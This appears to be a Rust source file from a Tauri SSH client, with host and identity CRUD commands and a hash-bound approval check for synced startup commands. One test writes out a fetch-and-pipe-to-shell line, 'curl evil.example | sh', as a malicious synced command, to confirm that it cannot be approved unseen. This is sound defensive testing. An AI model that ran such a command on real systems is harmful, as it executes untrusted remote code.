//! Host + identity CRUD. All validation runs in-app (`Host::validate`)
//! before any local write.

use serde::Serialize;
use tauri::State;
use termru_core::ExecFields;
use termru_core::host::Host;
use termru_core::identity::Identity;
use termru_core::ids::{GroupId, HostId, IdentityId, TagId};
use termru_core::taxonomy::{Group, Tag};

use crate::app_error::CommandError;
use crate::state::AppState;

fn hosts(state: &AppState) -> termru_store::Repos<'_> {
    state.store.repos()
}

#[tauri::command]
pub fn host_list(state: State<'_, AppState>) -> Result<Vec<Host>, CommandError> {
    Ok(hosts(&state).hosts().list()?)
}

/// Saves a host.
///
/// `approve_exec` is true only for a save the user made in this device's
/// editor: the host's exec-like fields (startup command, agent forwarding,
/// environment, forwards that are not loopback only) are approved as saved,
/// in the same transaction. Every other save (moving a host to a folder, an
/// import) leaves the approval as it was, so a synced startup command cannot
/// be approved by touching the host.
#[tauri::command]
pub fn host_save(
    state: State<'_, AppState>,
    mut host: Host,
    approve_exec: Option<bool>,
) -> Result<Host, CommandError> {
    host.validate()?;
    if approve_exec == Some(true) {
        hosts(&state).hosts().save_approved(&mut host)?;
    } else {
        hosts(&state).hosts().save(&mut host)?;
    }
    Ok(host)
}

/// The exec-like fields of a host and whether this device approved them: what
/// the review dialog shows.
#[derive(Debug, Clone, Serialize)]
pub struct HostExecReview {
    pub host_id: termru_core::ids::HostId,
    pub host_name: String,
    /// The hash of `fields`. Sent back by `host_exec_approve`, which accepts
    /// it only while the stored host still has these exact fields.
    pub hash: String,
    /// The fields are not approved on this device (and there are some).
    pub pending: bool,
    pub fields: ExecFields,
}

pub(crate) fn review_exec(
    store: &termru_store::Store,
    id: HostId,
) -> Result<HostExecReview, CommandError> {
    let host = store
        .repos()
        .hosts()
        .get(id)?
        .ok_or_else(|| CommandError::not_found("host", &id.to_string()))?;
    let status = store.repos().hosts().exec_status(&host)?;
    Ok(HostExecReview {
        host_id: host.id,
        host_name: host.name.clone(),
        hash: status.hash,
        pending: !status.approved,
        fields: host.exec_fields(),
    })
}

/// Approves the fields that hash to `hash`. The hash is recomputed from the
/// stored host: what is approved is what the user was shown, never other
/// values.
pub(crate) fn approve_exec(
    store: &termru_store::Store,
    id: HostId,
    hash: &str,
) -> Result<(), CommandError> {
    match store.repos().hosts().approve_exec(id, hash)? {
        termru_store::ApproveOutcome::Approved => Ok(()),
        termru_store::ApproveOutcome::Changed => Err(CommandError::new(
            "The synced settings of this host changed after you opened the review. \
             Review them again.",
        )),
    }
}

#[tauri::command]
pub fn host_exec_review(
    state: State<'_, AppState>,
    id: HostId,
) -> Result<HostExecReview, CommandError> {
    review_exec(&state.store, id)
}

#[tauri::command]
pub fn host_exec_approve(
    state: State<'_, AppState>,
    id: HostId,
    hash: String,
) -> Result<(), CommandError> {
    approve_exec(&state.store, id, &hash)
}

/// A recently-used host as the frontend sees it: the host profile next to
/// the last connection time (ms since the epoch) for the "Last session"
/// column of the hosts table.
#[derive(Debug, Clone, serde::Serialize)]
#[serde(rename_all = "snake_case")]
pub struct RecentHost {
    pub host: Host,
    pub last_used_at: i64,
}

/// Recently connected hosts (most recent first).
#[tauri::command]
pub fn recent_list(state: State<'_, AppState>) -> Result<Vec<RecentHost>, CommandError> {
    Ok(hosts(&state)
        .recents()
        .list()?
        .into_iter()
        .map(|entry| RecentHost {
            host: entry.host,
            last_used_at: entry.last_used_at,
        })
        .collect())
}

#[tauri::command]
pub fn host_delete(state: State<'_, AppState>, id: HostId) -> Result<(), CommandError> {
    hosts(&state).hosts().soft_delete(id)?;
    Ok(())
}

#[tauri::command]
pub fn host_set_favorite(
    state: State<'_, AppState>,
    id: HostId,
    favorite: bool,
) -> Result<(), CommandError> {
    hosts(&state).hosts().set_favorite(id, favorite)?;
    Ok(())
}

#[tauri::command]
pub fn identity_list(state: State<'_, AppState>) -> Result<Vec<Identity>, CommandError> {
    Ok(hosts(&state).identities().list()?)
}

#[tauri::command]
pub fn identity_save(
    state: State<'_, AppState>,
    mut identity: Identity,
) -> Result<Identity, CommandError> {
    identity.validate()?;
    hosts(&state).identities().save(&mut identity)?;
    Ok(identity)
}

#[tauri::command]
pub fn identity_delete(state: State<'_, AppState>, id: IdentityId) -> Result<(), CommandError> {
    hosts(&state).identities().soft_delete(id)?;
    Ok(())
}

/// The folders (groups) of the hosts.
#[tauri::command]
pub fn group_list(state: State<'_, AppState>) -> Result<Vec<Group>, CommandError> {
    Ok(hosts(&state).groups().list()?)
}

#[tauri::command]
pub fn group_save(state: State<'_, AppState>, mut group: Group) -> Result<Group, CommandError> {
    group.validate()?;
    hosts(&state).groups().save(&mut group)?;
    Ok(group)
}

#[tauri::command]
pub fn group_delete(state: State<'_, AppState>, id: GroupId) -> Result<(), CommandError> {
    hosts(&state).groups().soft_delete(id)?;
    Ok(())
}

/// The tags of the hosts.
#[tauri::command]
pub fn tag_list(state: State<'_, AppState>) -> Result<Vec<Tag>, CommandError> {
    Ok(hosts(&state).tags().list()?)
}

#[tauri::command]
pub fn tag_save(state: State<'_, AppState>, mut tag: Tag) -> Result<Tag, CommandError> {
    tag.validate()?;
    hosts(&state).tags().save(&mut tag)?;
    Ok(tag)
}

#[tauri::command]
pub fn tag_delete(state: State<'_, AppState>, id: TagId) -> Result<(), CommandError> {
    hosts(&state).tags().soft_delete(id)?;
    Ok(())
}

/// The device-local key bindings: which key file each identity uses on this
/// machine. The paths never leave the device (they are not part of the sync
/// payload), but the user has to see them to know which key an identity
/// refers to.
#[derive(Debug, Clone, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct IdentityBinding {
    pub identity_id: IdentityId,
    pub key_path: String,
}

#[tauri::command]
pub fn identity_bindings(state: State<'_, AppState>) -> Result<Vec<IdentityBinding>, CommandError> {
    let bindings = hosts(&state).identities().bindings()?;
    let mut out: Vec<IdentityBinding> = bindings
        .into_iter()
        .map(|(identity_id, key_path)| IdentityBinding {
            identity_id,
            key_path,
        })
        .collect();
    out.sort_by_key(|binding| binding.identity_id.to_string());
    Ok(out)
}

/// Binds an identity to a device-local private key path (the key file is
/// never copied into the database).
#[tauri::command]
pub fn identity_bind(
    state: State<'_, AppState>,
    id: IdentityId,
    key_path: String,
) -> Result<(), CommandError> {
    let trimmed = key_path.trim();
    if trimmed.is_empty() {
        return Err(CommandError::new("key path must not be empty"));
    }
    if !std::path::Path::new(trimmed).is_absolute() {
        return Err(CommandError::new("key path must be absolute"));
    }
    hosts(&state).identities().bind(id, trimmed)?;
    Ok(())
}

#[tauri::command]
pub fn identity_unbind(state: State<'_, AppState>, id: IdentityId) -> Result<(), CommandError> {
    hosts(&state).identities().unbind(id)?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn recent_host_wire_shape_carries_the_last_used_at_next_to_the_host() {
        let host = Host::new("web".into(), "web.example.com".into(), "deploy".into());
        let dto = RecentHost {
            host,
            last_used_at: 1_760_000_000_000,
        };
        let json = serde_json::to_value(&dto).unwrap();
        assert_eq!(json["last_used_at"], 1_760_000_000_000_i64);
        assert_eq!(json["host"]["name"], "web");
        assert_eq!(json["host"]["address"], "web.example.com");
    }
}

#[cfg(test)]
mod exec_approval_tests {
    use super::*;
    use termru_core::{EnvVar, Forward, ForwardKind};

    fn store() -> (tempfile::TempDir, termru_store::Store) {
        let dir = tempfile::tempdir().expect("temp dir");
        let store = termru_store::Store::open(&dir.path().join("test.sqlite")).expect("store");
        (dir, store)
    }

    fn host() -> Host {
        let mut host = Host::new("web".into(), "web.test".into(), "deploy".into());
        host.startup_command = Some("tmux attach".into());
        host.env = vec![EnvVar {
            name: "LANG".into(),
            value: "C".into(),
        }];
        host.forwards = vec![Forward {
            kind: ForwardKind::Local,
            bind_address: Some("0.0.0.0".into()),
            bind_port: 9000,
            target_host: Some("db".into()),
            target_port: Some(5432),
            enabled: true,
        }];
        host
    }

    #[test]
    fn the_review_lists_exactly_what_is_withheld() {
        let (_dir, store) = store();
        let mut host = host();
        host.agent_forward = true;
        store.repos().hosts().save(&mut host).unwrap();
        let review = review_exec(&store, host.id).unwrap();
        assert!(review.pending);
        assert_eq!(review.host_name, "web");
        assert_eq!(
            review.fields.startup_command.as_deref(),
            Some("tmux attach")
        );
        assert!(review.fields.agent_forward);
        assert_eq!(review.fields.env.len(), 1);
        assert_eq!(review.fields.forwards.len(), 1);
        assert_eq!(review.hash, host.exec_hash());
        // What the dialog receives: the fields as plain data.
        let json = serde_json::to_value(&review).unwrap();
        assert_eq!(json["fields"]["forwards"][0]["bind_address"], "0.0.0.0");
        assert_eq!(json["pending"], true);
    }

    #[test]
    fn approving_the_reviewed_hash_clears_the_review() {
        let (_dir, store) = store();
        let mut host = host();
        store.repos().hosts().save(&mut host).unwrap();
        let review = review_exec(&store, host.id).unwrap();
        approve_exec(&store, host.id, &review.hash).unwrap();
        assert!(!review_exec(&store, host.id).unwrap().pending);
    }

    #[test]
    fn the_frontend_cannot_approve_values_it_was_not_shown() {
        let (_dir, store) = store();
        let mut host = host();
        store.repos().hosts().save(&mut host).unwrap();
        let shown = review_exec(&store, host.id).unwrap();

        // A sync changes the command between the review and the click.
        let mut changed = host.clone();
        changed.startup_command = Some("curl evil.example | sh".into());
        store.repos().hosts().save(&mut changed).unwrap();

        let error = approve_exec(&store, host.id, &shown.hash).unwrap_err();
        assert!(error.message.contains("changed"), "{}", error.message);
        assert!(review_exec(&store, host.id).unwrap().pending);
        // A made-up hash is refused the same way.
        assert!(approve_exec(&store, host.id, "00").is_err());
        // The new values can be approved once they have been seen.
        let fresh = review_exec(&store, host.id).unwrap();
        approve_exec(&store, host.id, &fresh.hash).unwrap();
        assert!(!review_exec(&store, host.id).unwrap().pending);
    }

    #[test]
    fn an_unknown_host_has_nothing_to_review() {
        let (_dir, store) = store();
        assert!(review_exec(&store, HostId::new()).is_err());
        assert!(approve_exec(&store, HostId::new(), "00").is_err());
    }
}
